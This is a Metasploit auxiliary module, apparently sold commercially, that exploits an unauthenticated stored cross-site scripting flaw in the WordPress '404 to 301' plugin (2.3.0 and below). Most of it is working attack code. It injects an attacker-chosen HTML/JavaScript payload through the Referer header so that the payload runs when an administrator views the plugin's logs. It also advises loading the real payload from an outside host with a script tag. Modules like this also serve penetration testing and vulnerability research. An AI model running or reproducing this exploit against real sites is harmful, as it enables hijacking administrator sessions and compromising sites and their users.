##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress 404 to 301 Plugin Persistent XSS',
      'Description'    => %q{
    This module exploits an unauthenticated stored cross-site scripting
    vulnerability in the popular 404 to 301 plugin for Wordpress.

    Versions 2.3.0 and below of the 404 to 301 Wordpress plugin were vulnerable to
    an unauthenticated stored cross-site scripting vulnerability manifested in
    the admin panel when viewing logs. This module exploits the vulnerability
    to include arbitrary HTML/Javascript that will be run when an admin views
    the logs. Fixed in version 2.3.1.

    Categories: Open Source, Wordpress, XSS

    Price: 3

    Video: https://asciinema.org/a/dXgZ0q7gSrhxe0130xDZAyVhH

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'References'     =>
        [
        ],
      'Author'         =>
        [
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => ''
    ))

    register_options(
      [
         OptString.new("TARGETURI", [true, 'The relative URI', '/']),
         OptString.new("HTML", [true, 'The HTML to include as the cross-site scripting payload.', nil])
      ], self.class)
  end

  def run

   if datastore['HTML'] =~ /'/ or datastore['HTML'] =~ /"/
      print_bad("HTML payload can't contain single- or double-quotes. Reference complex javascript with a simple <script src=http://xxx/foo.js></script> payload instead.")
      return
   end

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php', Rex::Text.rand_text_alpha(10)),
      'headers' => {
        'Referer' => datastore['HTML']
      }
    })

    if res && res.code == 404
      print_bad("404 returned. This means the instance is likely not vulnerable.")
    elsif res && res.code == 301
      print_good("301 returned! The host is potentially vulnerable and the payload was successfully sent.")
    end

  end
end

